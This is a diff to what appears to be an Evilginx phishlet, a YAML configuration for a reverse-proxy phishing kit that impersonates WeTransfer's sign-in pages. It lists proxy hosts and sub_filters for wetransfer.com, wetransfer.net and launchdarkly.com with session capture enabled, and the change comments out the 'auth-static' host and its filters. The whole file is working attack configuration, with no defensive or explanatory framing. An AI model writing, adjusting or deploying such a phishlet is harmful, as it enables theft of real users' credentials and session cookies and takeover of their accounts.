@@ -4,7 +4,7 @@ min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: '', orig_sub: '', domain: 'wetransfer.com', session: true, is_landing: true, auto_filter: false}
   - {phish_sub: 'auth', orig_sub: 'auth', domain: 'wetransfer.com', session: true, is_landing: false, auto_filter: false}
-  - {phish_sub: 'auth-static', orig_sub: 'auth-static', domain: 'wetransfer.com', session: true, is_landing: false, auto_filter: false}
+  #- {phish_sub: 'auth-static', orig_sub: 'auth-static', domain: 'wetransfer.com', session: true, is_landing: false, auto_filter: false}
   - {phish_sub: 'snowplow', orig_sub: 'snowplow', domain: 'wetransfer.com', session: false, is_landing: false, auto_filter: false}
   - {phish_sub: 'backgrounds', orig_sub: 'backgrounds', domain: 'wetransfer.net', session: false, is_landing: false, auto_filter: false}
   - {phish_sub: 'auth-session-caching', orig_sub: 'auth-session-caching', domain: 'wetransfer.net', session: false, is_landing: false, auto_filter: false}
@@ -21,8 +21,8 @@ sub_filters:
   - {triggers_on: 'wetransfer.com', orig_sub: 'backgrounds', domain: 'wetransfer.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'wetransfer.com', orig_sub: 'auth-session-caching', domain: 'wetransfer.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'wetransfer.com', orig_sub: 'auth-session-caching', domain: 'wetransfer.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'wetransfer.com', orig_sub: 'auth-static', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'wetransfer.com', orig_sub: 'auth-static', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  #- {triggers_on: 'wetransfer.com', orig_sub: 'auth-static', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  #- {triggers_on: 'wetransfer.com', orig_sub: 'auth-static', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'wetransfer.com', orig_sub: 'app', domain: 'launchdarkly.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'wetransfer.com', orig_sub: 'app', domain: 'launchdarkly.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
 
